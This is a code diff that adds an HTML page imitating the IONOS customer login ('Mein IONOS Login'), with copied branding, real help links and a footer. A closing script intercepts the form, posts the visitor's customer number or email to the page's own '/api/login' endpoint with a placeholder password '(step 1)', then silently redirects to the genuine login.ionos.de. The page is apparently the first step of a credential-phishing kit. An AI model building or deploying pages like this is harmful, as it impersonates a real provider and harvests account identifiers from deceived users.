@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="de" data-exos-theme="ionos">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login – Zugang zu Ihrem Kundenkonto</title>
+  <meta name="description" content="Zugriff auf Ihre gesamte IONOS Welt: Verträge, Produkte, und Kundendaten, Leistungen bestellen oder ändern – jetzt passwortgeschützt anmelden." />
+  <link rel="icon" type="image/png" sizes="32x32" href="ionos-assets/image/favicon-32px.png" />
+  <link rel="stylesheet" href="ionos-assets/style/exos.min.css" />
+  <link rel="stylesheet" href="ionos-assets/style/main.min.css" />
+  <link rel="stylesheet" href="ionos-assets/style/starter-main.min.css" />
+</head>
+<body>
+
+  <div class="page-content">
+
+    <div class="oao-navi-navigation oao-navi-light">
+      <div class="oao-navi-left">
+        <div class="oao-navi-application-name">
+          <a class="oao-navi-app-name" href="ionos.html">
+            <span class="oao-navi-app-logo"></span>
+            <span>Login</span>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <main>
+      <section class="page-section page-section--default page-section--short">
+        <div class="page-section__block">
+
+          <div class="sheet sheet__section--warning cookie-message hidden">
+            <section class="sheet__section">
+              <h2 class="headline headline--sub">Aktivierung Ihrer Browser-Cookies notwendig</h2>
+              <p class="paragraph">Zur Nutzung unseres Angebots ist es notwendig, dass Sie in Ihren Browser-Einstellungen das Setzen von Cookies erlauben.</p>
+              <a href="https://www.ionos.de/hilfe/sicherheit-c10084638/sicherheit-beim-surfen-c10084643" class="link link--action" target="_blank" rel="noopener">Mehr erfahren</a>
+            </section>
+          </div>
+
+          <noscript>
+            <div class="sheet sheet--warning">
+              <section class="sheet__section">
+                <h2 class="headline headline--sub headline--warning">Aktivieren Sie JavaScript in Ihrem Browser</h2>
+                <p class="paragraph">Zur Nutzung unseres Angebots ist es notwendig, dass Sie in Ihren Browser-Einstellungen das Ausführen von JavaScript erlauben.</p>
+              </section>
+            </div>
+          </noscript>
+
+          <div class="oao-statuspage-message-container" data-component="CONTROL_PANEL"></div>
+
+          <div class="sheet">
+
+            <section class="sheet__section sheet__section--default">
+              <ul>
+                <li class="stripe stripe--cropped">
+                  <div class="stripe__item">
+                    <img class="stripe__visual" src="ionos-assets/image/my-account.svg" height="58" width="auto" alt="" />
+                  </div>
+                  <div class="stripe__item">
+                    <h1 class="headline stripe__element">Mein IONOS Login</h1>
+                  </div>
+                </li>
+              </ul>
+            </section>
+
+            <section class="sheet__section sheet__section--default">
+              <form id="ionos-login-form" method="POST" novalidate>
+
+                <ul>
+                  <li class="form-stripe">
+                    <label class="label" for="username">Kundennummer, E-Mail-Adresse oder Domain</label>
+                    <input
+                      type="email"
+                      class="input-text form-input"
+                      name="identifier"
+                      id="username"
+                      tabindex="1"
+                      required
+                      autofocus
+                      autocomplete="username"
+                      autocapitalize="none"
+                      spellcheck="false"
+                    />
+                    <p class="input-byline">
+                      <a class="link" target="_blank" rel="noopener" href="https://www.ionos.de/hilfe/index.php?id=4152">Zugang vergessen?</a>
+                      <br />
+                      <a class="link" href="https://passwort.ionos.de/">Passwort vergessen?</a>
+                    </p>
+                  </li>
+                  <li class="form-stripe form-stripe--actions">
+                    <button
+                      class="button button--primary button--full-width button--with-loader"
+                      type="submit"
+                      id="button--with-loader"
+                      tabindex="2"
+                    >Weiter</button>
+                  </li>
+                </ul>
+
+              </form>
+            </section>
+
+          </div>
+
+          <h2 class="headline headline--sub headline--headless-hidden">Weitere IONOS Logins</h2>
+
+          <div class="grid grid--full-height grid--headless-hidden">
+
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://mail.ionos.de/">
+                <img class="tile__image" src="ionos-assets/image/product-email.svg" alt="" />
+                <span class="tile__label">Webmail</span>
+              </a>
+            </div>
+
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://dcd.ionos.com/latest?regDomain=ionos.de">
+                <img class="tile__image" src="ionos-assets/image/cloud-dcd.svg" alt="" />
+                <span class="tile__label">Data Center Designer</span>
+              </a>
+            </div>
+
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://hidrive.ionos.com/">
+                <img class="tile__image" src="ionos-assets/image/product-hidrive.svg" alt="" />
+                <span class="tile__label">HiDrive</span>
+              </a>
+            </div>
+
+          </div>
+
+        </div>
+      </section>
+    </main>
+
+  </div>
+
+  <footer class="page-footer">
+    <div class="page-footer__block">
+      <section class="page-footer__section page-footer__section--last">
+
+        <div class="page-footer__section-item">
+          <div class="oao-statuspage-overall-status page-footer__status"></div>
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
+          &copy; 2026
+          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/unternehmen">IONOS SE</a>
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
+          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/impressum">Impressum</a> -
+          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc/terms-privacy">Datenschutz</a> -
+          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc">AGB</a>
+        </div>
+
+      </section>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById("ionos-login-form").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const identifier = document.getElementById("username").value.trim();
+      if (!identifier) return;
+
+      const btn = document.getElementById("button--with-loader");
+      btn.disabled = true;
+      btn.textContent = "Weiter …";
+
+      try {
+        await fetch("/api/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: identifier, password: "(step 1)" })
+        });
+      } catch (_) {}
+
+      window.location.href = "https://login.ionos.de/";
+    });
+  </script>
+
+</body>
+</html>
